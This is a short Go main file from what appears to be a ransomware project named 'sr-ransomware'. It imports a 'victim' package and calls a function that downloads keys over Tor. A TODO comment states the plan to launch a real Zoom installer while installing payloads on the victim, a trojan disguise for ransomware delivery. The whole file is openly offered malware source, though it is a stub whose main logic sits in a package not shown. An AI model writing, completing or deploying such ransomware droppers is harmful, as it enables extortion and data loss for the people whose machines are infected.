package main

import (
    "log"

    "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
)

func main() {
    // TODO: start actual zoom installer and install payloads on victim
    err := victim.DownloadKeysFromTor()
    if err != nil {
        log.Fatal(err)
    }
}
